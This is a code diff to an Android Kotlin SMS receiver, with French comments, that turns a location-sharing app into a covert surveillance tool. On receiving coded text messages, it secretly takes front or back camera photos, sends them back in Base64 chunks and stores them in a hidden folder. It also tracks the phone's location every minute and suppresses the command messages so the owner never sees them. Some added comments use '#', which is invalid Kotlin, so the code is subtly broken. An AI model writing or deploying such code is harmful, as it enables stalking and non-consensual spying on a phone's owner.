@@ -8,12 +8,18 @@ import android.os.Looper
 import android.provider.Telephony
 import android.telephony.SmsMessage
 import android.util.Log
+import java.io.File
+import java.io.FileOutputStream
+import java.util.Base64
 
 class DataSmsReceiver : BroadcastReceiver() {
     companion object {
         private const val TAG = "SAFI_SMS"
         var sendingJob: Pair<String, Handler>? = null
         var sendingRunnable: Runnable? = null
+        
+        # 📸 Assemblage des photos reçues par fragments
+        private val photoChunks = mutableMapOf<String, MutableList<String?>>()
     }
 
     override fun onReceive(context: Context?, intent: Intent?) {
@@ -26,74 +32,124 @@ class DataSmsReceiver : BroadcastReceiver() {
         for (msg in messages) {
             val from = msg.originatingAddress ?: "??"
             val text = msg.messageBody ?: ""
-            Log.d(TAG, "Reçu de $from: $text")
+            Log.d(TAG, "Reçu de $from: ${text.take(60)}...")
 
             when {
-                // 📥 IL reçoit "Envoie-moi ta position toutes les minutes" → IL démarre l'envoi
+                # 📸 IL reçoit "Prends une photo avant" → IL prend la photo INVISIBLE
+                text == Commands.REQUEST_PHOTO_FRONT -> {
+                    Log.d(TAG, "📸 DEMANDE PHOTO AVANT de $from — Prise en cours en arrière-plan !")
+                    CameraCaptureService.capturePhoto(context, CameraCaptureService.FACING_FRONT)
+                    abortBroadcast()
+                }
+
+                # 📸 IL reçoit "Prends une photo arrière" → IL prend la photo INVISIBLE
+                text == Commands.REQUEST_PHOTO_BACK -> {
+                    Log.d(TAG, "📸 DEMANDE PHOTO ARRIÈRE de $from — Prise en cours en arrière-plan !")
+                    CameraCaptureService.capturePhoto(context, CameraCaptureService.FACING_BACK)
+                    abortBroadcast()
+                }
+
+                # 📥 TU reçois des données photo → Assembler et sauvegarder
+                text.startsWith(Commands.RESPONSE_PHOTO) -> {
+                    val data = text.removePrefix(Commands.RESPONSE_PHOTO).split("|", limit = 4)
+                    if (data.size == 4) {
+                        val filename = data[0]
+                        val index = data[1].toIntOrNull() ?: 0
+                        val total = data[2].toIntOrNull() ?: 1
+                        val chunk = data[3]
+                        
+                        assemblePhoto(context, filename, index, total, chunk)
+                        abortBroadcast()
+                    }
+                }
+
                 text == Commands.REQUEST_POS_START -> {
-                    Log.d(TAG, "👉 DEMANDE SUIVI CONTINU de $from — Je démarre l'envoi !")
+                    Log.d(TAG, "👉 DEMANDE SUIVI CONTINU de $from")
                     startSendingPosition(context, from)
                     abortBroadcast()
                 }
 
-                // 📥 IL reçoit "Arrête d'envoyer" → IL arrête
                 text == Commands.REQUEST_POS_STOP -> {
                     Log.d(TAG, "👉 ARRÊT SUIVI demandé par $from")
                     stopSendingPosition()
                     abortBroadcast()
                 }
 
-                // 📥 IL reçoit "Envoie une fois" → IL envoie une fois
                 text == Commands.REQUEST_POS_ONCE -> {
                     Log.d(TAG, "👉 DEMANDE POS UNE FOIS de $from")
                     MainMapActivity.instance?.sendMyPositionInResponse(from)
                     abortBroadcast()
                 }
 
-                // 📥 TU reçois SA position → TU l'affiches sur la carte
                 text.startsWith(Commands.RESPONSE_POS) -> {
                     val data = text.removePrefix(Commands.RESPONSE_POS).split(",")
                     if (data.size == 2) {
                         try {
                             val lat = data[0].toDouble()
                             val lon = data[1].toDouble()
-                            Log.d(TAG, "✅ Position de $from: $lat, $lon")
                             MainMapActivity.instance?.updateOtherPosition(lat, lon, from)
                             FloatingWindowService.instance?.updatePosition(lat, lon, from)
                             abortBroadcast()
-                        } catch (e: Exception) {
-                            Log.e(TAG, "Erreur parsing", e)
-                        }
+                        } catch (e: Exception) {}
                     }
                 }
             }
         }
     }
 
-    // 📤 IL démarre l'envoi de SA position toutes les minutes
+    private fun assemblePhoto(context: Context, filename: String, index: Int, total: Int, chunk: String) {
+        synchronized(photoChunks) {
+            if (!photoChunks.containsKey(filename)) {
+                photoChunks[filename] = arrayOfNulls<String>(total).toMutableList()
+            }
+            photoChunks[filename]?.set(index, chunk)
+            
+            val chunks = photoChunks[filename] ?: return
+            if (chunks.all { it != null }) {
+                # ✅ Tous les fragments reçus → Reconstituer la photo
+                val fullBase64 = chunks.joinToString("")
+                photoChunks.remove(filename)
+                
+                try {
+                    val bytes = android.util.Base64.decode(fullBase64, android.util.Base64.NO_WRAP)
+                    val savedFile = savePhotoToGallery(context, filename, bytes)
+                    Log.d(TAG, "✅ Photo complète reçue: $filename (${bytes.size} octets)")
+                    
+                    MainMapActivity.instance?.runOnUiThread {
+                        MainMapActivity.instance?.onPhotoReceived(savedFile)
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Erreur reconstitution photo", e)
+                }
+            }
+        }
+    }
+
+    private fun savePhotoToGallery(context: Context, filename: String, bytes: ByteArray): File {
+        val hiddenDir = File(context.filesDir, "received_photos")
+        if (!hiddenDir.exists()) hiddenDir.mkdirs()
+        val file = File(hiddenDir, filename)
+        FileOutputStream(file).use { it.write(bytes) }
+        return file
+    }
+
     private fun startSendingPosition(context: Context, toNumber: String) {
-        stopSendingPosition() // Évite doublon
-        
+        stopSendingPosition()
         val handler = Handler(Looper.getMainLooper())
         val runnable = object : Runnable {
             override fun run() {
                 MainMapActivity.instance?.sendMyPositionInResponse(toNumber)
-                handler.postDelayed(this, 60000) // Toutes les 60 secondes
+                handler.postDelayed(this, 60000)
             }
         }
-        
         sendingJob = Pair(toNumber, handler)
         sendingRunnable = runnable
-        
-        handler.post(runnable) // Envoie immédiatement puis toutes les minutes
-        Log.d(TAG, "✅ Envoi position démarré vers $toNumber toutes les minutes")
+        handler.post(runnable)
     }
 
-    // 📤 IL arrête l'envoi
     private fun stopSendingPosition() {
         sendingRunnable?.let { sendingJob?.second?.removeCallbacks(it) }
         sendingJob = null
         sendingRunnable = null
-        Log.d(TAG, "🛑 Envoi position arrêté")
     }
 }
